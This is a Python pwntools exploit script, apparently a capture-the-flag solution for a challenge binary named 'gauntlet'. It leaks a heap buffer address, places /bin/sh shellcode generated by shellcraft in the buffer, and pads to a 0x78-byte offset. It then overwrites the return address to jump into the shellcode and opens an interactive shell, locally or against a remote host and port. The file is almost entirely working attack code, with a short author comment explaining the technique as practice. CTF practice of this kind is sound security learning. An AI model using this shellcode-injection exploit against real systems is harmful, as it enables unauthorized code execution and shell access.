#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template gauntlet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'gauntlet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

RIP_DIST = 0x78

payload = asm(shellcraft.sh())

log.info("""same as last challenge, but no sigsegv handler. instead, we're shellcoding.

i'm using this as a chance to play with shellcraft for the first time. obviously, this is easy mode.
but how many times am i going to do the same challenge with hand-coded shellcode lol.

anyway, rip is 0x78 bytes from the malloc'd buffer. the program gives us &buf so we just jmp back into that.""")

io = start()

buf_addr = int(io.readline().strip().decode('latin1'), 16)
io.info(f"buf = {hex(buf_addr)}")

io.sendline(b"anime desu")
pause()
io.sendline(payload + b"A" * (RIP_DIST - len(payload)) + p64(buf_addr))

io.interactive()

